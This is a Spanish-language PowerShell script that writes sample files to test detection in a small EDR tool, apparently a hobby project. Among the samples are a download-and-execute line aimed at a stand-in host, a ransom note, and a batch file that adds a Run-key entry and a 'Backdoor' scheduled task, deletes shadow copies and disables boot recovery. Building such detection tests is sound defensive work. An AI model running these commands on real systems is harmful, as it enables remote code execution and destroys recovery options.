# Script de Prueba para NEXO EDR
# Ejecuta esto para crear archivos de prueba y ver el sistema en acción

Write-Host "`n🧪 GENERADOR DE ARCHIVOS DE PRUEBA - NEXO EDR`n" -ForegroundColor Cyan

# Verificar que el usuario está seguro
$confirm = Read-Host "Esto creará archivos de prueba en Desktop\EDR_TEST. ¿Continuar? (S/N)"
if ($confirm -ne "S" -and $confirm -ne "s") {
    Write-Host "❌ Cancelado.`n" -ForegroundColor Red
    exit
}

# Crear carpeta de pruebas
$testPath = "$env:USERPROFILE\Desktop\EDR_TEST"
New-Item -Path $testPath -ItemType Directory -Force | Out-Null

Write-Host "`n📂 Creando archivos de prueba en: $testPath`n" -ForegroundColor Yellow

# Archivo 1: Mimikatz (YARA detectará esto)
Write-Host "  [1/5] Creando: mimikatz_fake.exe" -ForegroundColor White
"This file contains the string: mimikatz" | Out-File "$testPath\mimikatz_fake.exe"

# Archivo 2: PowerShell sospechoso
Write-Host "  [2/5] Creando: download_script.ps1" -ForegroundColor White
"Invoke-WebRequest -Uri http://malware.com/payload.exe | Invoke-Expression" | Out-File "$testPath\download_script.ps1"

# Archivo 3: Ransomware note
Write-Host "  [3/5] Creando: DECRYPT_YOUR_FILES.txt" -ForegroundColor White
@"
YOUR FILES HAVE BEEN ENCRYPTED!

To decrypt your files, send 1 Bitcoin to:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

Visit: http://xyz123abc.onion for instructions
"@ | Out-File "$testPath\DECRYPT_YOUR_FILES.txt"

# Archivo 4: Batch malicioso
Write-Host "  [4/5] Creando: system_destroy.bat" -ForegroundColor White
@"
@echo off
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware
schtasks /create /tn "Backdoor" /tr "cmd.exe"
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled no
"@ | Out-File "$testPath\system_destroy.bat"

# Archivo 5: Archivo limpio (no debería detectarse)
Write-Host "  [5/5] Creando: safe_document.txt (archivo limpio)" -ForegroundColor Green
"Este es un archivo completamente seguro para verificar que no hay falsos positivos." | Out-File "$testPath\safe_document.txt"

Write-Host "`n✅ ¡Archivos creados exitosamente!`n" -ForegroundColor Green

Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Cyan
Write-Host "📋 INSTRUCCIONES:" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -ForegroundColor Cyan

Write-Host "1. Inicia NEXO EDR:" -ForegroundColor White
Write-Host "   python main.py`n" -ForegroundColor Gray

Write-Host "2. Selecciona una de estas opciones:" -ForegroundColor White
Write-Host "   • Opción 10: MODO MONITOR (verás detección en tiempo real)" -ForegroundColor Gray
Write-Host "   • Opción 4:  ESCANEAR ARCHIVOS (análisis estático)`n" -ForegroundColor Gray

Write-Host "3. El EDR debería detectar y poner en cuarentena:" -ForegroundColor White
Write-Host "   🚨 mimikatz_fake.exe (YARA: Mimikatz_Strings)" -ForegroundColor Red
Write-Host "   🚨 download_script.ps1 (YARA: Suspicious_PowerShell_Download)" -ForegroundColor Red
Write-Host "   🚨 DECRYPT_YOUR_FILES.txt (YARA: Ransomware_Note)" -ForegroundColor Red
Write-Host "   🚨 system_destroy.bat (YARA: Suspicious_Batch_Commands)" -ForegroundColor Red
Write-Host "   ✅ safe_document.txt (NO debería detectarse)`n" -ForegroundColor Green

Write-Host "4. Verifica la cuarentena:" -ForegroundColor White
Write-Host "   • Opción 11 en el menú del EDR" -ForegroundColor Gray
Write-Host "   • O revisa manualmente: mini-edr\quarantine\`n" -ForegroundColor Gray

Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -ForegroundColor Cyan

# Abrir la carpeta automáticamente
Start-Process explorer.exe $testPath

Write-Host "✨ Presiona Enter para finalizar..." -ForegroundColor Cyan
Read-Host
